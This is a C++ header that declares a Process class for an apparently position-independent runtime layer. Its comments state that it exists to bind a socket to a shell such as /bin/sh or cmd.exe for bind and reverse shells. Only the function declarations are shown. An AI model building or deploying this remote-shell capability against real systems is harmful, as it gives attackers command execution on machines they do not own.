/**
 * process.h - Process Execution Functions
 *
 * Provides process creation and I/O redirection for bind/reverse shell functionality.
 * Position-independent, no .rdata dependencies.
 *
 * Part of RUNTIME (Runtime Abstraction Layer).
 */

#pragma once

#include "core.h"

// Process constants
constexpr INT32 PROCESS_INVALID_PID = -1;

/**
 * Process - Static class for process management operations
 *
 * Provides fork/exec functionality with I/O redirection for shell binding.
 */
class Process
{
public:
    /**
     * BindSocketToShell - Spawn a process and redirect socket to its stdin/stdout/stderr
     *
     * @param socketFd Socket file descriptor to redirect
     * @param processPath Full path to executable (e.g., "/bin/sh" or "C:\Windows\System32\cmd.exe")
     * @return Child PID on success, -1 on error
     *
     * NOTE: Caller must provide the full path to the executable.
     *       Use environment variables to get correct paths:
     *       - Linux: SHELL (e.g., "/bin/bash")
     *       - Windows: COMSPEC (e.g., "C:\Windows\System32\cmd.exe")
     */
    static SSIZE BindSocketToShell(SSIZE socketFd, const CHAR* processPath) noexcept;

    /**
     * Fork - Create a child process
     *
     * @return 0 in child, child PID in parent, -1 on error
     */
    static SSIZE Fork() noexcept;

    /**
     * Dup2 - Duplicate file descriptor
     *
     * @param oldfd Source file descriptor
     * @param newfd Target file descriptor
     * @return newfd on success, -1 on error
     */
    static SSIZE Dup2(SSIZE oldfd, SSIZE newfd) noexcept;

    /**
     * Execve - Execute a program
     *
     * @param pathname Path to executable
     * @param argv Argument array (NULL terminated)
     * @param envp Environment array (NULL terminated)
     * @return Does not return on success, -1 on error
     */
    static SSIZE Execve(const CHAR* pathname, CHAR* const argv[], CHAR* const envp[]) noexcept;

    /**
     * Setsid - Create a new session
     *
     * @return Session ID on success, -1 on error
     */
    static SSIZE Setsid() noexcept;

    // Prevent instantiation
    VOID* operator new(USIZE) = delete;
    VOID operator delete(VOID*) = delete;
};
